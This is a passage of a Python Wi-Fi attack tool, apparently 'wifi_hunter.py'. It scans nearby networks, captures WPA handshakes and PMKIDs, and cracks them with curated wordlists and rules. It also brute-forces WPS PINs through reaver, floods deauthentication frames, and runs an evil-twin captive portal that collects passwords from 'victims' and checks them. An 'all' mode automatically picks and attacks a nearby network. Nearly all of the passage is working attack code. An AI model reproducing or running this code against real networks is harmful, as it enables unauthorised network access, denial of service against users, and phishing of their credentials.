                                b"\x01" * 32, b"\x02" * 32))
    check("PRF-512 length", len(ptk) == 64)
    check("PRF deterministic", ptk == prf512(pmk, ptk_input(bytes.fromhex("001122334455"),
                                                            bytes.fromhex("66778899aabb"),
                                                            b"\x01" * 32, b"\x02" * 32)))

    # 3) WPS checksum
    check("WPS checksum(1234567)==0", wps_checksum("1234567") == "0")

    # 4) mask + rules
    check("mask expansion", sum(1 for _ in mask_iter("?d?d?l")) == 2600)
    check("rules produce variants", sum(1 for _ in apply_rules("pass", ["capital", "append_digits"])) > 100)
    check("rule combo (capital + year)", "Sunshine2024" in set(apply_rules("sunshine", ["capital", "append_years"])))

    # 5) handshake + pmkid round trip through pcap, collector, 22000 and cracker
    tmpdir = Path(args.out or Path(str(HERE / ".selftest")))
    tmpdir.mkdir(parents=True, exist_ok=True)
    pcap = tmpdir / "vector.pcapng"
    ssid = b"SelfTestNet"
    pw = b"Hunter2pass"
    frames, pmkid_t, eapol_t = synth_case(ssid, pw)
    write_test_pcap(pcap, frames, radiotap=True)

    col_ = analyze_pcap(pcap, verbose=False)
    check("beacon parsed", any(s == ssid for s in col_.ssids.values()))
    check("pmkid extracted", eapol_t.ap in [t.ap for t in col_.targets() if t.kind == "pmkid"])
    check("handshake paired", any(t.kind == "eapol" for t in col_.targets()))
    check("ssid recovered", col_.ssid_of(eapol_t.ap) == ssid)

    targets = col_.targets()
    check("22000 round trip", all(parse_22000(t.to_22000()) is not None for t in targets))
    check("verify_password(pmkid)", verify_password(pmkid_t, pw))
    check("verify_password(eapol)", verify_password(eapol_t, pw))
    check("verify_password(wrong)", not verify_password(eapol_t, b"wrongpassword"))

    found = crack(targets, iter(["nope1234", pw.decode(), "other123"]), total=3, workers=2, progress=False)
    check("cracker recovers both target kinds", len({f["uid"].split(":")[0] for f in found}) == 2, f"({len(found)} hits)")

    # 6) eapol parser sanity
    ek = parse_eapol(_mk_eapol(2, 2, 9, b"\x05" * 32))
    check("eapol message detection", ek is not None and ek.msg == 2)
    check("eapol key info bits", ek is not None and ek.pairwise and ek.has_mic and not ek.ack)

    if not args.keep:
        shutil.rmtree(tmpdir, ignore_errors=True)
    say("")
    if failures:
        bad(f"{failures} test(s) failed")
        return 1
    ok("all tests passed")
    return 0


# --------------------------------------------------------------------------------------
# commands: recon
# --------------------------------------------------------------------------------------
def _filter_aps(aps: list[AP], args) -> list[AP]:
    out = aps
    if getattr(args, "min_signal", 0):
        out = [a for a in out if a.signal >= args.min_signal]
    if getattr(args, "sec", None):
        want = {s.upper() for s in args.sec.split(",")}
        out = [a for a in out if a.sec in want]
    if getattr(args, "ssid", None):
        rx = re.compile(args.ssid, re.I)
        out = [a for a in out if rx.search(a.ssid)]
    if getattr(args, "open_only", False):
        out = [a for a in out if a.sec == "OPEN"]
    if getattr(args, "limit", 0):
        out = out[: args.limit]
    return out


def cmd_scan(args) -> int:
    def once() -> list[AP]:
        aps = _filter_aps(scan_aps(args.source, args.iface), args)
        hr(f"nearby networks - {time.strftime('%H:%M:%S')}")
        print_ap_table(aps, show_vendor=not args.no_vendor)
        for i, a in enumerate(aps, 1):
            if a.sec in ("OPEN", "WEP", "WPA") or (a.wps and a.sec == "WPA2"):
                say(f"  {i:>2}. {col(a.ssid or '<hidden>', C.B)} -> {a.advice()}"
                    + (col("  [WPS enabled]", C.YEL) if a.wps else ""))
        if args.json:
            p = Path(args.json)
            p.parent.mkdir(parents=True, exist_ok=True)
            if p.exists():
                try:
                    old = json.loads(p.read_text(encoding="utf-8"))
                except Exception:
                    old = {}
                merged = {x["bssid"]: x for x in old.get("aps", [])}
                for a in aps:
                    merged[a.bssid] = a.to_dict()
                aps_all = list(merged.values())
            else:
                aps_all = [a.to_dict() for a in aps]
            p.write_text(
                json.dumps({"host": platform.node(), "ts": time.time(), "aps": aps_all}, indent=2, ensure_ascii=False),
                encoding="utf-8",
            )
            ok(f"saved {len(aps)} network(s) -> {p}")
        return aps

    if args.watch:
        try:
            while True:
                once()
                time.sleep(args.watch)
        except KeyboardInterrupt:
            say("")
            return []
    aps = once()
    if aps:
        say(col("next:", C.B) + " capture -i <iface> -b <bssid> -c <channel>   then   crack")
    return aps


def live_stats_loop(collector: Collector, seconds: float, every: float = 2.0) -> None:
    t0 = time.time()
    while time.time() - t0 < seconds:
        time.sleep(every)
        el = int(time.time() - t0)
        say(
            f"\r{col('[*]', C.CYN)} {el:3d}s  frames {collector.counts['frames']:>6}  "
            f"ap {len(collector.ssids):>3}  clients {len(collector.clients):>3}  "
            f"eapol {collector.counts['eapol']:>3}  hs {len([t for t in collector.targets() if t.kind == 'eapol']):>2}  "
            f"pmkid {collector.counts['pmkid']:>2}   ",
            end="",
        )
    say("")


def cmd_sniff(args) -> int:
    if args.pcap:
        col_ = analyze_pcap(args.pcap)
        return _print_capture_summary(col_, args)
    if not require_scapy():
        return 1
    iface = wifi_iface_name(args.iface)
    if not iface:
        bad("no wireless interface")
        return 1
    if args.monitor:
        set_monitor(iface, True)
    su, msg = monitor_status(iface)
    if su is not True:
        warn(f"monitor mode: {msg} - in managed mode you will only see broadcast/beacon traffic")
    col_ = Collector()
    pcap_out = Path(args.out or OUTDIR) / f"sniff-{int(time.time())}.pcap"
    pcap_out.parent.mkdir(parents=True, exist_ok=True)

    from scapy.all import sniff, wrpcap  # type: ignore

    stop = threading.Event()
    tick = threading.Thread(target=live_stats_loop, args=(col_, args.seconds), daemon=True)
    tick.start()
    pkts = sniff(iface=iface, timeout=args.seconds, store=True, prn=lambda p: col_.feed(bytes(p)))
    wrpcap(str(pcap_out), pkts)
    ok(f"pcap saved: {pcap_out}")
    return _print_capture_summary(col_, args, pcap_path=pcap_out)


def _print_capture_summary(col_: Collector, args, pcap_path: Path | None = None) -> int:
    hr("summary")
    say(f"frames       : {col_.counts['frames']}")
    say(f"eapol frames : {col_.counts['eapol']}  (m1 {col_.counts['m1']} m2 {col_.counts['m2']} m3 {col_.counts['m3']} m4 {col_.counts['m4']})")
    say(f"pmkid        : {col_.counts['pmkid']}")
    if col_.ssids:
        say("")
        hr("access points")
        table(["BSSID", "SSID", "SEC", "CIPHER", "WPS", "PMF"],
              [[r["bssid"], r["ssid"] or "<hidden>", r["auth"], r["cipher"],
                "?" if r["wps"] is None else ("yes" if r["wps"] else "no"),
                "?" if r["pmf"] is None else ("yes" if r["pmf"] else "no")] for r in col_.aps()])
    if col_.probes:
        say("")
        hr("probe requests (client wants to join)")
        table(["SSID", "COUNT"], [[s or "<wildcard>", str(n)] for s, n in col_.probes.most_common(args.top or 15)])
    if col_.clients:
        say("")
        say(f"clients seen: {len(col_.clients)}")
    targets = col_.targets()
    if targets:
        say("")
        ok(f"{len(targets)} crackable target(s) found:")
        table(["KIND", "SSID", "AP", "CLIENT"],
              [[t.kind, t.ssid_txt, mac_str(t.ap), mac_str(t.sta)] for t in targets])
        out_stem = Path(args.out or OUTDIR) / "hashes"
        for p in save_targets(targets, out_stem):
            say(f"  -> {p}")
        say(col("  crack with: ", C.B) + f"wifi_hunter.py crack -i {out_stem.with_suffix('.22000')} -w rockyou.txt")
    else:
        warn("no handshake / PMKID in this capture")
        if pcap_path:
            say(f"  try again while a client connects, or add --deauth: {pcap_path}")
    return 0


# --------------------------------------------------------------------------------------
# commands: capture + hashes
# --------------------------------------------------------------------------------------
def _capture_targets(args) -> list[Target]:
    col_ = Collector()
    if args.pcap:
        col_ = analyze_pcap(args.pcap)
    else:
        if not require_scapy():
            return []
        iface = wifi_iface_name(args.iface)
        if not iface:
            bad("no wireless interface")
            return []
        su, msg = monitor_status(iface)
        if su is not True:
            warn(f"monitor mode: {msg}")
            warn("capture works but may see very little - see `doctor`")
        if args.monitor:
            set_monitor(iface, True)
        deauth = (args.bssid, args.client) if args.deauth and args.bssid else None
        live_capture(
            iface, args.timeout, col_, channel=args.channel,
            pcap_out=(Path(args.out or OUTDIR) / f"capture-{int(time.time())}.pcap"),
            deauth=deauth, hop=args.hop,
        )
    if args.ssid and args.bssid:
        try:
            col_.set_ssid(args.bssid, args.ssid)
        except Exception:
            pass
    return col_.targets(need_ssid=not args.allow_hidden)


def cmd_capture(args) -> int:
    if args.bssid:
        info(f"target AP {args.bssid}" + (f" channel {args.channel}" if args.channel else ""))
    targets = _capture_targets(args)
    if not targets:
        warn("no handshake or PMKID captured")
        return 1
    hr("captured")
    table(["KIND", "SSID", "AP", "CLIENT", "KEYVER"],
          [[t.kind, t.ssid_txt, mac_str(t.ap), mac_str(t.sta), str(t.keyver)] for t in targets])
    stem = Path(args.out or OUTDIR) / f"captured-{int(time.time())}"
    for p in save_targets(targets, stem):
        say(f"  -> {p}")
    ok("now crack it:")
    say(f"  wifi_hunter.py crack -i {stem.with_suffix('.22000')} -w rockyou.txt --rules best")
    return 0


def cmd_hash(args) -> int:
    col_ = analyze_pcap(args.pcap)
    if args.ssid and args.bssid:
        try:
            col_.set_ssid(args.bssid, args.ssid)
        except Exception:
            pass
    targets = col_.targets(need_ssid=not args.allow_hidden)
    if not targets:
        bad("nothing crackable found in that capture")
        return 1
    stem = Path(args.out or (Path(args.pcap).with_suffix("")))
    for p in save_targets(targets, stem):
        say(f"  -> {p}")
    table(["KIND", "SSID", "AP", "CLIENT", "PMKID/MIC"],
          [[t.kind, t.ssid_txt, mac_str(t.ap), mac_str(t.sta),
            (t.pmkid.hex() if t.kind == "pmkid" else t.mic.hex())[:32]] for t in targets])
    ok(f"{len(targets)} hash(es) ready - hashcat -m 22000 compatible")
    return 0


# --------------------------------------------------------------------------------------
# commands: cracking
# --------------------------------------------------------------------------------------
def cmd_crack(args) -> int:
    if args.list_rules:
        hr("rules")
        for k, v in RULE_HELP.items():
            say(f"  {k:18s} {v}")
        hr("presets")
        for k, v in RULE_PRESETS.items():
            say(f"  {k:18s} {', '.join(v) if v else '(none)'}")
        return 0

    targets: list[Target] = []
    if args.pcap:
        targets = analyze_pcap(args.pcap).targets(need_ssid=True)
    if args.input:
        targets += load_targets(args.input)
    if args.ssid_target:
        rx = re.compile(args.ssid_target, re.I)
        targets = [t for t in targets if rx.search(t.ssid_txt)]

    uniq: dict[str, Target] = {}
    for t in targets:
        uniq.setdefault(t.uid, t)
    targets = list(uniq.values())
    if not targets:
        bad("no hash given (-i file.22000 / --pcap capture.pcapng)")
        return 1

    info(f"{len(targets)} target(s):")
    for t in targets:
        say(f"   {col(t.kind.upper(), C.YEL)} {t.ssid_txt}  ap={mac_str(t.ap)} sta={mac_str(t.sta)}")

    cands, total = build_candidates(args)
    nproc = args.workers or max(1, min(os.cpu_count() or 4, 16))
    if total:
        info(f"keyspace ~{human(total)} candidates on {nproc} workers")
        if total > 5e9:
            warn("that is a lot - consider a GPU (hashcat) for this keyspace")

    t0 = time.time()
    found = crack(targets, cands, total=total, workers=nproc, pot=args.pot,
                  progress=not args.quiet, chunk_size=args.chunk_size)
    el = time.time() - t0
    say("")
    if not found:
        bad(f"nothing cracked after {human_time(el)}")
        return 1
    hr("recovered")
    for f in found:
        say(f"  {col(f['password'], C.GRN + C.B)}   <- {f['target']}  ({f['from']})")
    if args.out:
        p = Path(args.out)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps({"found": found, "ts": time.time()}, indent=2, ensure_ascii=False), encoding="utf-8")
        ok(f"saved -> {p}")
    return 0


def cmd_verify(args) -> int:
    targets = load_targets(args.input)
    if args.ssid_target:
        rx = re.compile(args.ssid_target, re.I)
        targets = [t for t in targets if rx.search(t.ssid_txt)]
    if not targets:
        bad("no matching target")
        return 1
    good = 0
    for t in targets:
        v = verify_password(t, args.password)
        good += int(v)
        say(f"  {col('VALID  ', C.GRN) if v else col('invalid', C.RED)} {t.kind:6s} {t.ssid_txt} ({mac_str(t.ap)})")
    return 0 if good else 1


# --------------------------------------------------------------------------------------
# commands: WPS / deauth / evil twin
# --------------------------------------------------------------------------------------
def cmd_wps(args) -> int:
    if args.list_pins:
        if not args.bssid:
            bad("--list-pins needs --bssid")
            return 1
        pins = wps_pins(args.bssid, args.ssid or "", limit=args.limit)
        for p in pins[: args.limit]:
            say(f"  {p}")
        info(f"{len(pins)} PIN(s); polish order manually, then run with --pin")
        return 0
    if args.scan:
        rows = wps_scan(wifi_iface_name(args.iface) or "wlan0")
        table(["BSSID", "CH", "RSSI", "WPS", "LOCK", "SSID"],
              [[r.get("bssid", ""), r.get("channel", ""), r.get("rssi", ""), r.get("wps", ""),
                r.get("lock", ""), r.get("ssid", "")] for r in rows])
        return 0

    iface = wifi_iface_name(args.iface) or "wlan0"
    if not args.bssid:
        bad("need --bssid (and --ssid for the pin list) or --scan")
        return 1
    pins = [args.pin] if args.pin else wps_pins(args.bssid, args.ssid or "", limit=args.limit)
    if not (have("reaver") or have("bully")):
        warn("reaver/bully not installed - printing commands only")
        for p in pins[:3]:
            say(f"  reaver -i {iface} -b {args.bssid} -c {args.channel or 6} -p {p} -vv")
        return 0

    t0 = time.time()
    for i, pin in enumerate(pins, 1):
        tool = ["reaver", "-i", iface, "-b", args.bssid, "-c", str(args.channel or 6), "-vv", "-d", "2"]
        if args.pixie:
            tool += ["-K", "1"]
            if have("pixiewps"):
                tool += ["-O", str(args.out or out("pixie.log"))]
        else:
            tool += ["-p", pin]
        info(f"[{i}/{len(pins)}] {' '.join(tool)}")
        rc, out = run(tool, timeout=args.pin_timeout)
        tail = [l for l in out.splitlines() if re.search(r"(WPS PIN|WPA PSK|Key|PIN:)", l, re.I)]
        for l in tail[-3:]:
            say(f"    {l.strip()}")
        if re.search(r"WPA PSK:\s*'([^']+)'", out):
            psk = re.search(r"WPA PSK:\s*'([^']+)'", out).group(1)
            ok(f"WPS cracked: PIN {pin} -> PSK {col(psk, C.GRN + C.B)}")
            if args.out:
                append_pot(args.out, f"wps:{args.bssid}", args.ssid or args.bssid, psk)
            return 0
        if time.time() - t0 > args.total_timeout:
            warn("total timeout reached")
            break
    bad("no PIN worked (router may be locked - wait and retry, or run pixie-dust)")
    return 1


def cmd_deauth(args) -> int:
    iface = wifi_iface_name(args.iface)
    if not iface:
        bad("no wireless interface")
        return 1
    if args.monitor:
        su, msg = monitor_status(iface)
        if su is not True:
            warn(msg)
        set_monitor(iface, True)
    if args.channel:
        set_channel(iface, args.channel)
    ap = mac_bytes(args.bssid)
    sta = mac_bytes(args.client) if args.client and args.client.lower() not in ("ff", "broadcast") else b"\xff" * 6
    sender = make_sender(iface, args.backend)
    if not sender:
        bad("no injection backend available")
        say("  linux: run as root with a monitor interface / windows: install Npcap with raw 802.11")
        return 1
    info(f"deauth {mac_str(ap)} -> {mac_str(sta)} reason {args.reason} x{args.count}")
    sent = 0
    try:
        for i in range(args.count):
            if sender.send(build_deauth(ap, sta, args.reason, i)):
                sent += 1
            if args.count > 1:
                say(f"\r{col('[*]', C.CYN)} sent {sent}/{args.count}", end="")
            time.sleep(args.interval)
        say("")
        ok(f"{sent} frame(s) sent")
    finally:
        sender.close()
    if sent == 0:
        warn("0 frames sent - adapter/driver likely does not support injection")
        return 1
    return 0


def cmd_evil(args) -> int:
    iface = wifi_iface_name(args.iface) or "wlan0"
    ssid = args.ssid
    outdir = Path(args.out or out("evil"))
    iface2 = args.iface2 or iface
    files = write_evil_configs(outdir, ssid, iface2, args.channel, args.bssid)
    ok(f"configs written to {outdir}")
    for k, v in files.items():
        say(f"  {k:9s} {v}")

    targets: list[Target] = []
    if args.hashes:
        targets = load_targets(args.hashes)
        if args.ssid_target:
            rx = re.compile(args.ssid_target, re.I)
            targets = [t for t in targets if rx.search(t.ssid_txt)]
        if targets:
            ok(f"{len(targets)} hash(es) loaded for live verification")
        else:
            warn("hash file had no usable target - submissions won't be verified")

    found_path = Path(args.found or out("portal-submits.jsonl"))
    found_path.parent.mkdir(parents=True, exist_ok=True)

    portal = PortalServer(args.bind, args.port, ssid, targets, found_path)
    portal.start()
    ok(f"captive portal on http://{args.bind}:{args.port}/")

    procs: list[subprocess.Popen] = []
    if args.serve:
        if have("hostapd") and have("dnsmasq"):
            procs.append(subprocess.Popen(["hostapd", str(files["hostapd"])]))
            procs.append(subprocess.Popen(["dnsmasq", "-C", str(files["dnsmasq"]), "-d"]))
            ok("hostapd + dnsmasq started")
        else:
            warn("hostapd/dnsmasq missing - portal is running but no fake AP")

    if args.deauth and args.bssid and have("scapy") is not False:
        def kick() -> None:
            try:
                from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp  # type: ignore

                ap = mac_bytes(args.bssid)
                pkt = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff",
                                         addr2=ap, addr3=ap) / Dot11Deauth(reason=7)
                while not portal.stop.is_set():
                    sendp(pkt, iface=iface, count=3, inter=0.1, verbose=False)
                    time.sleep(args.deauth_interval)
            except Exception as e:  # noqa: BLE001
                warn(f"deauth loop stopped: {e}")

        threading.Thread(target=kick, daemon=True).start()
        info(f"deauth flood against {args.bssid} every {args.deauth_interval}s")

    say("")
    say(col("bait SSID: ", C.B) + ssid + col(f"  password for the fake AP: hunter12345", C.DIM))
    say("waiting for victims (Ctrl+C to stop) ...")
    try:
        deadline = time.time() + args.seconds if args.seconds else None
        while True:
            time.sleep(1)
            if portal.hits and any(valid for _, valid in portal.hits):
                ok("valid password captured - stopping")
                break
            if deadline and time.time() > deadline:
                break
    except KeyboardInterrupt:
        say("")
    finally:
        portal.shutdown()
        for p in procs:
            p.terminate()
        if portal.hits:
            hr("submissions")
            for pw, valid in portal.hits:
                say(f"  {col(pw, C.GRN + C.B) if valid else pw}  {'VALID' if valid else 'wrong'}")
    return 0


# --------------------------------------------------------------------------------------
# commands: keygen / report
# --------------------------------------------------------------------------------------
def cmd_keygen(args) -> int:
    vendor = args.vendor or oui_vendor(args.mac)
    if not vendor:
        warn("unknown vendor for that MAC - using generic patterns")
    cands = keygen(args.mac, args.ssid or "", vendor, limit=args.limit)
    if args.pattern:
        h = re.sub(r"[^0-9a-f]", "", args.mac.lower())
        for pat in args.pattern.split(","):
            cands.insert(0, pat.format(mac=h, last6=h[-6:], last4=h[-4:], ssid=args.ssid or ""))
    if args.test:
        targets = load_targets(args.test)
        for c in cands:
            hits = [t for t in targets if verify_password(t, c)]
            if hits:
                ok(f"{col(c, C.GRN + C.B)} matches {hits[0].ssid_txt} ({mac_str(hits[0].ap)})")
    if args.out and not args.show_all:
        for c in cands[:10]:
            say(c)
        say(f"... {max(0, len(cands) - 10)} more")
    else:
        for c in cands:
            say(c)
    if args.out:
        p = Path(args.out)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text("\n".join(cands) + "\n", encoding="utf-8")
        ok(f"{len(cands)} candidate(s) -> {p}")
    return 0


def cmd_report(args) -> int:
    scan: list[dict] = []
    if args.scan:
        data = json.loads(Path(args.scan).read_text(encoding="utf-8"))
        scan = data.get("aps", data if isinstance(data, list) else [])
    found: list[dict] = []
    for src in args.found or []:
        p = Path(src)
        if not p.exists():
            warn(f"missing {p}")
            continue
        txt = p.read_text(encoding="utf-8", errors="replace")
        if p.suffix == ".json":
            try:
                found.extend(json.loads(txt).get("found", []))
            except Exception:
                pass
        else:
            for line in txt.splitlines():
                try:
                    found.append(json.loads(line))
                except Exception:
                    pass
    if not scan and not found:
        bad("nothing to report (--scan scan.json / --found found.json)")
        return 1
    out = Path(args.out or out(f"report-{int(time.time())}.html"))
    build_report(scan, found, out)
    ok(f"report -> {out}")
    return 0


# --------------------------------------------------------------------------------------
# commands: all-in-one
# --------------------------------------------------------------------------------------
def cmd_all(args) -> int:
    outdir = Path(args.out or OUTDIR)
    outdir.mkdir(parents=True, exist_ok=True)
    scan_path = outdir / "scan.json"
    args.json = str(scan_path)
    args.no_vendor = False
    aps = cmd_scan(args)
    if not aps:
        return 1

    eligible = [a for a in aps if a.sec != "OPEN"]
    if not eligible:
        warn("all networks are open - nothing to crack")
        return 0
    pick = eligible[0]
    if args.target:
        pick = eligible[min(args.target, len(eligible)) - 1]
    hr(f"attacking: {pick.ssid or '<hidden>'} ({pick.bssid})")
    if pick.sec == "WEP":
        warn("WEP: use aircrack-ng ARP replay for a quick win")
    if pick.sec == "WPA3":
        warn("WPA3-SAE: needs hcxdumptool transition/downgrade capture")

    cap = argparse.Namespace(
        pcap=None, iface=args.iface, bssid=pick.bssid, client=None, channel=pick.channel,
        monitor=True, timeout=args.timeout, out=str(outdir), ssid=pick.ssid,
        allow_hidden=True, hop=not pick.channel, deauth=True,
    )
    targets = _capture_targets(cap)
    if not targets:
        warn("no handshake captured - trying keygen + builtin wordlist anyway")
    if targets:
        stem = outdir / "hashes"
        for p in save_targets(targets, stem):
            say(f"  -> {p}")

    crack_ns = argparse.Namespace(
        input=str(outdir / "hashes.22000") if targets else None,
        pcap=None, wordlist=args.wordlist or "curated", extra_words=None,
        rules="medium", mask=None, bruteforce=None, min_len=8, max_len=10,
        custom1=None, custom2=None, custom3=None, custom4=None,
        workers=args.workers, pot=str(outdir / "pot.jsonl"), quiet=False,
        chunk_size=400, out=str(outdir / "found.json"), ssid_target=None,
        list_rules=False,
    )
    found: list[dict] = []
    if targets:
        cmd_crack(crack_ns)
        fp = outdir / "found.json"
        if fp.exists():
            found = json.loads(fp.read_text(encoding="utf-8")).get("found", [])
    kg = cmd_keygen(argparse.Namespace(mac=pick.bssid, ssid=pick.ssid, vendor=pick.vendor,
                                       limit=400, out=None, pattern=None,
                                       test=str(outdir / "hashes.22000") if targets else None))
    del kg
    rep = argparse.Namespace(scan=str(scan_path), found=[str(outdir / "found.json")] if found else None,
                             out=str(outdir / "report.html"))
    cmd_report(rep)
    hr("done")
    return 0



# --------------------------------------------------------------------------------------
# wordlists: curated builders, remote fetch, multi-list resolution
# --------------------------------------------------------------------------------------
WORDLIST_DIR = HERE / "wordlists"
DOWNLOAD_DIR = WORDLIST_DIR / "downloaded"

SECLISTS = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords"
PROBABLE = "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords"

REMOTE_LISTS: dict[str, tuple[str, str]] = {
    "wpa-top62": (f"{SECLISTS}/WiFi-WPA/probable-v2-wpa-top62.txt", "wifi"),
    "wpa-top447": (f"{SECLISTS}/WiFi-WPA/probable-v2-wpa-top447.txt", "wifi"),
    "wpa-top4800": (f"{SECLISTS}/WiFi-WPA/probable-v2-wpa-top4800.txt", "wifi"),
    "common-10k": (f"{SECLISTS}/Common-Credentials/Pwdb_top-10000.txt", "common"),
    "common-100k": (f"{SECLISTS}/Common-Credentials/Pwdb_top-100000.txt", "common"),
    "probable-12k": (f"{PROBABLE}/Top12Thousand-probable-v2.txt", "probable"),
    "probable-304k": (f"{PROBABLE}/Top304Thousand-probable-v2.txt", "probable"),
    "rockyou": ("https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "huge"),
}
REMOTE_GROUPS: dict[str, list[str]] = {
    "wifi": ["wpa-top62", "wpa-top447", "wpa-top4800"],
    "common": ["common-10k", "common-100k"],
    "probable": ["probable-12k", "probable-304k"],
    "all": list(REMOTE_LISTS),
    "huge": ["common-100k", "probable-304k", "rockyou"],
}

# ---------------- curated (generated locally, offline) ----------------
CURATED_BASES = """
password pass passwd passwort clave contrasena senha wachtwoord parola
welcome welcome1 admin admin123 administrator root toor default changeme
master monkey dragon shadow sunshine princess football baseball basketball
superman batman matrix secret freedom trustno internet wireless wifi wlan
router modem network mywifi mynet mynetwork myhome homewifi homenet
home house apartment office officewifi work company guest guests visitor
mobile phone iphone android samsung xiaomi huawei redmi nokia
mercusys tplink dlink netgear linksys asus zyxel mikrotik tenda ubiquiti
tehran iran persian farsi shiraz mashhad tabriz isfahan ahvaz qom kish
ali reza rezaa hossein mohammad mohammadreza amir amirahmad hassan saeed
sara maryam fatemeh neda nazi zahra elham mina parisa shirin
perspolis esteghlal sepahan tractor barcelona realmadrid liverpool milan
espresso terminal linux ubuntu kali hacker hunter h4cker joker neo
summer winter spring autumn spring2024 norooz yalda
iloveyou iloveyou1 lovely1 mylove mylife family mother father
baby angel butterfly flower rose diamond silver golden tiger lion eagle
coffee chocolate pizza hamburger cola pepsi
azadi pars negar parsa arman arash babak behdad kamran kian
""".split()

CURATED_SUFFIX = [
    "", "1", "2", "7", "9", "01", "07", "123", "1234", "12345", "123456",
    "111", "1111", "000", "0000", "786", "110", "1375", "1380", "1390",
    "1400", "1401", "1402", "1403", "1404", "2020", "2021", "2022",
    "2023", "2024", "2025", "!", "@", "!!", "@123", "#1", "_1", ".1",
]

PERSIAN_EXTRA = """
ali110 ali1234 alireza amir1234 arman123 ashkan babak123 bahar behnam
behzad borna danial ehsan emad farhad farid farzad hamid hesam hossein1
ilya iman kamran kaveh kian kiandokht mahdi majid masoud mehdi mehran
milad morteza navid omid peyman pouya ramin reza1234 rostam sahand sajjad
saman soroush soheil vahid yasin yashar
abolfazl amin arash arian artin aydin bardia benyamin erfan hadi
nima parham parsa payam pouyan shayan sohrab
""".split()

CITY_SUFFIX = ["", "123", "1234", "1400", "2024", "!"]


def _curated_common() -> Iterator[str]:
    seen: set[str] = set()
    for base in CURATED_BASES:
        for suf in CURATED_SUFFIX:
            w = base + suf
            if 3 <= len(w) <= 63 and w not in seen:
                seen.add(w)
                yield w
    for base in CURATED_BASES:
        cap = base.capitalize()
        for suf in ("123", "1234", "12345", "2024", "1403", "!", "@123"):
            w = cap + suf
            if 3 <= len(w) <= 63 and w not in seen:
                seen.add(w)
                yield w
    for base in ("tehran", "iran", "wifi", "home", "office"):
        for suf in ("123", "1234", "12345", "2024", "1980"):
            w = base + suf
            if 3 <= len(w) <= 63 and w not in seen:
                seen.add(w)
                yield w


def _curated_numeric() -> Iterator[str]:
    seen: set[str] = set()

    def add(w: str) -> Iterator[str]:
        if len(w) >= 3 and w not in seen:
            seen.add(w)
            return iter([w])
        return iter(())

    for w in (
        "12345678", "12345679", "12345680", "123456789", "1234567890", "0123456789",
        "87654321", "987654321", "12341234", "123123123", "11223344", "12121212",
        "01010101", "10101010", "1122334455", "1234512345", "147258369", "741852963",
        "159753486", "25801473", "1234554321", "9876543210", "112233445566",
        "0999999999", "0912345678", "0935765432", "00000000", "11111111", "22222222",
        "33333333", "44444444", "55555555", "66666666", "77777777", "88888888",
        "99999999", "0000000000", "1111111111", "1234567812", "78678678", "11011011",
    ):
        yield from add(w)

    for mm in range(1, 13):
        for dd in range(1, 29):
            for yy in range(1350, 1405):
                yield from add(f"{yy}{mm:02d}{dd:02d}")
    for yy in (1350, 1360, 1370, 1375, 1380, 1385, 1390, 1395, 1400, 1401, 1402, 1403, 1404):
        for mm in range(1, 13):
            yield from add(f"{yy}{mm:02d}")
            yield from add(f"{mm:02d}{yy}")
    for d in (1980, 1985, 1990, 1995, 2000, 2001, 2002, 2010, 2020):
        for m in range(1, 13):
            yield from add(f"{m:02d}{d}")
    for pref in ("0912", "0919", "0935", "0938", "0901", "0902", "0920", "0921",
                 "0930", "0933", "0939", "0990", "0991", "0992"):
        for tail in ("1234567", "0000000", "1111111", "7654321", "12345678",
                     "12345", "123456", "1122334", "0101010", "13751375"):
            yield from add(pref + tail)
    for a in range(10):
        for b in range(10):
            yield from add(f"{a}{b}{a}{b}{a}{b}{a}{b}")


def _curated_persian() -> Iterator[str]:
    seen: set[str] = set()
    words = list(dict.fromkeys(PERSIAN_EXTRA))
    for w in words:
        if len(w) >= 3 and w not in seen:
            seen.add(w)
            yield w
        for suf in CITY_SUFFIX[1:]:
            x = w + suf
            if len(x) >= 3 and x not in seen:
                seen.add(x)
                yield x
    for y in ("1350", "1360", "1370", "1380", "1390", "1400", "1403", "1404"):
        yield f"iran{y}"
        yield f"tehran{y}"


def _curated_defaults() -> Iterator[str]:
    seen: set[str] = set()
    vendor_words = {
        "mercusys": ["admin", "mercusys", "mercusys123", "12345678"],
        "tplink": ["admin", "tplink", "tplink123", "12345678"],
        "dlink": ["admin", "dlink", "dlink123", "12345678"],
        "netgear": ["admin", "password", "netgear", "netgear123"],
        "linksys": ["admin", "linksys", "12345678"],
        "asus": ["admin", "asus", "asus1234", "Asus12345"],
        "zyxel": ["1234", "admin", "zyxel", "zyxel1234"],
        "huawei": ["admin", "huawei", "admin123", "Huawei@123"],
        "mikrotik": ["admin", "mikrotik", "12345678"],
        "tenda": ["admin", "tenda", "tenda1234"],
        "ubiquiti": ["ubnt", "ubiquiti", "ubnt1234"],
        "xiaomi": ["admin", "xiaomi", "xiaomi123"],
    }
    for brand, words in vendor_words.items():
        for w in words:
            for x in (w, f"{w}1234", f"{w}@123"):
                if 3 <= len(x) <= 63 and x not in seen:
                    seen.add(x)
                    yield x
    for x in ("admin", "password", "1234", "12345678", "1234567890", "adminadmin",
              "administrator", "root1234", "changeme", "default1", "guest1234",
              "setup1234", "installer", "config123", "support1", "service1"):
        if 3 <= len(x) <= 63 and x not in seen:
            seen.add(x)
            yield x


CURATED_BUILDERS: dict[str, Any] = {
    "top-wifi": lambda: itertools.chain(
        ((WORDLIST_DIR / "top-wifi.txt").read_text(encoding="utf-8", errors="replace").splitlines()
         if (WORDLIST_DIR / "top-wifi.txt").exists() else []),
        (w for w in BUILTIN_WORDS),
    ),
    "common": _curated_common,
    "numeric": _curated_numeric,
    "persian": _curated_persian,
    "router-defaults": _curated_defaults,
}
CURATED_ORDER = ["top-wifi", "common", "numeric", "persian", "router-defaults"]


def build_curated(names: Sequence[str] | None = None) -> list[Path]:
    WORDLIST_DIR.mkdir(parents=True, exist_ok=True)
    written: list[Path] = []
    for name in names or CURATED_ORDER:
        builder = CURATED_BUILDERS.get(name)
        if not builder:
            warn(f"unknown curated list: {name}")
            continue
        p = WORDLIST_DIR / f"{name}.txt"
        seen: set[str] = set()
        lines: list[str] = []
        for w in builder():
            w = w.strip()
